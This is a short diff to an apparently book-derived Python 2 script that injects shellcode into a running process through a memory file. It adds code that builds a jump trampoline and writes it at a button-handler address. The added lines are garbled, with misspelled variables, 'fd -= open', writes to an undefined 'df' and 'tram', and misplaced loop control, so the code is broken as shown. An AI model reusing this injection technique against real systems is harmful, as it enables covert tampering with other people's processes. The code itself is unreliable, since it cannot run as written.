@@ -48,6 +48,26 @@ for process in p.calculate():
 						fd.seek(physical+offset)
 						fd.write(sc)
 						fd.flush()
+						tramp = "\xbb%s" % struct.pack("<L", page[0]+offset)
+						tramp += "\xff\xe3"
+						if trampoline_offsetis not None:
+							break
+					except:
+						pass
+					fd.close()
+					if page[0] <= equals_button and equals_button < ((page[0]+page[1])-7):
+						print "[*] Found our trampoline traget at: 0x%08x" % (physical)
+						v_offset = equals_button - page[0]
+						trampoline_offset = pysical + v_offset
+						print "[*] Found our trampoline target at: 0x%08x" % (trampoline_offset)
+						if slack_space is not None:
+							break
+				print "[*] Writing trampoline..."
+				fd -= open(memory_file, "r+")
+				fd.seek(trampoline_offset)
+				df.write(tram)
+				fd.close()
+				print "[*] Done injecting code."
 
-					tramp = "\xbb%s" % struct.pack("<L", page[0]+offset)
+
 #continue page 159
